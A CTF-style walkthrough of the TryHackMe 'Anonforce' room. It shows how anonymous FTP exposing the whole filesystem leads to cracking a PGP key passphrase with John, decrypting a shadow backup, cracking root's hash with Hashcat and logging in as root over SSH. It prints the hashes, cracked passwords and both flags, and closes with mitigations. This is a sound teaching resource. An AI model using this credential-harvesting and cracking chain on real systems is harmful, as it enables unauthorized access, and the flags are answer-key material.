```
  █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗
 ██╔══██╗████╗  ██║██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
 ███████║██╔██╗ ██║██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗
 ██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝
 ██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗
 ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
              TryHackMe: Anonforce
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-09 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐☆☆☆

> ⏱️ ~9 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan: FTP (21), SSH (22), no HTTP
- [x] Feroxbuster confirmed no web interface
- [x] Anonymous FTP login: root filesystem exposed
- [x] Navigated to `/home/melodias/`: retrieved `user.txt` directly via FTP
- [x] Navigated to `/notread/`: retrieved `backup.pgp` and `private.asc`
- [x] Identified `private.asc` as a PGP private key (NSA-themed email address, naturally)
- [x] `gpg2john` converted key to crackable hash
- [x] John the Ripper cracked PGP passphrase → `xbox360`
- [x] `gpg --decrypt backup.pgp` → decrypted `/etc/shadow` backup
- [x] Identified root hash format (`$6$` = sha512crypt, Hashcat mode 1800)
- [x] Hashcat cracked root hash → `hikari`
- [x] SSH directly as `root`: retrieved root flag

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning and service detection
- 📂 FTP client: anonymous login and full filesystem traversal
- 🔐 GPG: importing private key and decrypting the shadow backup
- 🔑 gpg2john + John the Ripper: PGP key passphrase cracking
- 🔓 Hashcat: sha512crypt hash cracking (mode 1800)
- 🔑 SSH: direct root login

---

## ⚡ TL;DR

Anonymous FTP served the entire server filesystem. The user flag was readable directly from `/home/melodias/`. A world-readable `/notread/` directory contained a GPG-encrypted shadow file backup and the private key needed to decrypt it: passphrase cracked with John (`xbox360`). Decrypting the backup revealed the root sha512crypt hash, cracked with Hashcat to `hikari`. SSH directly as root.

---

## 📖 Introduction

Today's target is **Anonforce**: a box that achieves the remarkable feat of skipping the entire "web application with subtle vulnerabilities" phase and going straight to "here is the entire filesystem, help yourself." Anonymous FTP doesn't just expose a note or a key this time. It exposes everything: `/etc`, `/home`, `/root`: the whole hierarchy, readable and navigable like any other directory. The only thing standing between `anonymous` and root credentials is a GPG passphrase that John cracks in seconds. This is less a penetration test and more a guided tour. The door is labelled FTP and it was left wide open.

### Prerequisites

Readers are assumed to know:

- What anonymous FTP is and why exposing a filesystem root through it is catastrophic
- What GPG / PGP encryption is and how private keys relate to encrypted files
- What `/etc/shadow` contains and why its exposure is critical
- Basic Hashcat mode selection for Linux shadow hash formats

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

*Full-range sweep with RustScan, Nmap for service and version fingerprinting:*

```bash
rustscan -a 10.49.164.9 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 21/tcp | FTP | vsftpd 3.0.3: **anonymous login allowed** |
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |

No HTTP port: confirmed by a Feroxbuster attempt that immediately failed to connect. This is a two-service box and the story begins and ends with FTP.

Nmap's `ftp-anon` script does something unusual here: it doesn't just flag anonymous login as allowed, it lists the root directory of the FTP share:

```
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread  [NSE: writeable]
| drwx------    3 0        0            4096 Aug 11  2019 root
```

That's not a subdirectory of FTP storage. That's `/bin`, `/boot`, `/etc`, `/home`: the server's actual root filesystem, mounted as the FTP root. The `notread` directory stands out: world-readable and world-writable, owned by uid 1000. The `root` directory is listed too, though `drwx------` suggests it may not be readable by `ftp`. One thing at a time.

---

## 🚪 Foothold

*(~3 mins into the box)*

### Anonymous FTP: Full Filesystem Access

*Connecting with anonymous login:*

```bash
ftp 10.49.164.9
# Name: anonymous
# Password: (blank)
# 230 Login successful.
```

*The FTP root is the server's `/`:*

```bash
ftp> ls
# bin  boot  dev  etc  home  lib  notread  opt  root  tmp  usr  var ...
```

**What makes this so severe?** When FTP is configured with the server's filesystem root as the FTP chroot (rather than a dedicated, restricted directory), every file the FTP service user can read becomes accessible to any anonymous visitor. This is the difference between leaving a note on the doorstep and leaving the front door open with a map to the safe inside.

### User Flag: Direct FTP Download

*Navigating to melodias's home directory:*

```bash
ftp> cd /home/melodias
ftp> ls
# -rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
ftp> get user.txt
```

```bash
cat user.txt
```

```
606083fd33beb1284fc51f411a706af8
```

User flag collected without touching SSH. No credentials, no shell, no escalation required at this stage: just FTP navigation.

### The `/notread/` Directory

*Investigating the world-readable directory flagged by Nmap:*

```bash
ftp> cd /notread
ftp> ls
# -rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
# -rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
ftp> mget backup.pgp private.asc
```

Two files: `backup.pgp` is a PGP-encrypted archive; `private.asc` is an ASCII-armoured PGP private key. The pairing is obvious: the private key decrypts the backup. The slightly surreal part is that both are in the same directory, world-readable, with permissions `rwxrwxrwx`. Whoever set this up was not particularly worried about defence in depth.

### PGP Key Passphrase Cracking: John the Ripper

**What is PGP encryption?** Pretty Good Privacy (PGP) uses asymmetric key pairs: a public key to encrypt, a private key to decrypt. The private key itself is protected by a passphrase. Even if an attacker has the private key file, they need the passphrase to use it. `gpg2john` extracts the passphrase hash from the key file in a format John the Ripper understands.

*Importing the private key and converting it for cracking:*

```bash
gpg --import private.asc
gpg2john private.asc > hash.txt
```

John silently returned no results on the first run: the hash was already in the potfile from a prior session (same John behaviour seen on the Mustacchio box). Checking the potfile immediately:

```bash
john hash.txt --show
```

```
anonforce:xbox360: :anonforce <melodias@anonforce.nsa>: private.asc

1 password hash cracked, 0 left
```

PGP passphrase: `xbox360`. The key identity `anonforce <melodias@anonforce.nsa>` is a nice bit of box flavour: the NSA dot nsa domain is doing a lot of thematic work here.

### Decrypting the Shadow Backup

*Decrypting `backup.pgp` using the imported private key:*

```bash
gpg --decrypt backup.pgp
```

```
gpg: encrypted with elg512 key, ID AA6268D1E6612967
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
```

```
# decrypted output (relevant entries)
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7: :
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7: :
```

`backup.pgp` is a backup of `/etc/shadow`: encrypted, but now decrypted. Root's hash format is `$6$`: sha512crypt. The CAST5 warning is harmless: it's a cipher mismatch advisory between the key's preference list and the encryption algorithm used on the file.

---

## 🐚 Shell / Access

*(~15 mins into the box)*

### Root Hash Cracking: Hashcat

**Hash identification:** `$6$` = sha512crypt = Hashcat mode 1800. This is a slow, properly iterated hash: 5000 rounds by default. Hashcat estimated 7+ hours at ~514 H/s on CPU, but the password appeared in rockyou.txt early enough to crack in 12 seconds.

*Saving the root hash and cracking it:*

```bash
echo '$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0' > root_hash.txt
hashcat -m 1800 -a 0 root_hash.txt /usr/share/wordlists/rockyou.txt
```

```
$6$07nYFaYf$...:hikari

Status: Cracked
Progress: 6720/14344385 (0.05%)
Time: 12 seconds
```

Root password: `hikari`. Only 6720 candidates into the wordlist. For a box whose entire premise is that you have root's shadow hash, this is an appropriately swift ending.

*SSH directly as root:*

```bash
ssh root@10.49.164.9
# Password: hikari
```

```
root@ubuntu:~# cat root.txt
f706456440c7af4187810c31c6cebdce
```

---

## 💥 Exploitation

The complete attack chain:

1. **Anonymous FTP** with filesystem root exposed → navigated directly to `/home/melodias/user.txt` → user flag
2. **`/notread/`** contained `backup.pgp` (encrypted shadow) + `private.asc` (PGP private key)
3. **gpg2john + John** cracked PGP passphrase → `xbox360`
4. **`gpg --decrypt backup.pgp`** → plaintext `/etc/shadow` backup with root's sha512crypt hash
5. **Hashcat mode 1800** cracked root hash → `hikari`
6. **SSH as root** → root flag

---

## 🐇 Rabbit Holes

### John the Ripper Silent Skip

`john --wordlist=rockyou.txt hash.txt` returned "No password hashes left to crack" on both attempts. The hash had already been cracked and was sitting in John's potfile from a prior run (or the key had been imported previously). `john hash.txt --show` revealed the answer immediately. This is the same gotcha from the Mustacchio writeup: John's silence always means "check `--show`", not "uncrackable."

### melodias Hash (`$1$`)

The shadow backup also contains melodias's hash: `$1$` (MD5crypt, Hashcat mode 500). This is a weaker hash than root's `$6$` and could theoretically be cracked as well, but there's no need: the root path is already open and SSH as root bypasses any need for the user account. Noted for completeness.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `606083fd33beb1284fc51f411a706af8` | `/home/melodias/user.txt` (read directly via FTP) |
| Root | `f706456440c7af4187810c31c6cebdce` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Anonymous FTP with filesystem root as FTP root | Critical | Never configure FTP with `/` as the chroot; use a dedicated, isolated FTP directory with only intended files; disable anonymous access entirely if not required |
| Sensitive PGP-encrypted backup exposed in world-readable directory | Critical | Store backups outside the FTP tree; apply strict permissions (`700` or `600`); do not co-locate a private key with the data it protects |
| Weak PGP key passphrase (`xbox360`) in rockyou.txt | High | Use a long, randomly generated passphrase for any key protecting sensitive data |
| Root's shadow hash in an accessible backup | Critical | Never back up `/etc/shadow` to an FTP-accessible location; restrict shadow file access to root only and audit backup procedures regularly |
| Weak root password (`hikari`) cracked in 12 seconds | Critical | Use a long, randomly generated root password; consider disabling direct root SSH login (`PermitRootLogin no`) and requiring `sudo` from a non-root account |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** Anonymous FTP is almost never appropriate for production systems, but it's especially catastrophic when the FTP root is the server's filesystem root. The combination turns an unauthenticated network service into a complete read-access backdoor to every world-readable file on the machine. Always scope FTP shares to the minimum necessary directory, never `/`.

---

## 🔁 If I Did It Again

Skip checking `/root/` via FTP (it's `drwx------` and not readable by the FTP service user anyway) and go straight to `/notread/` after grabbing the user flag: the two files there are the entire path to root, and spending time exploring the rest of the filesystem is satisfying but not necessary.

---

## 🔚 Changelog

*Last updated: 2026-06-09*

---

[↑ Back to top](#)
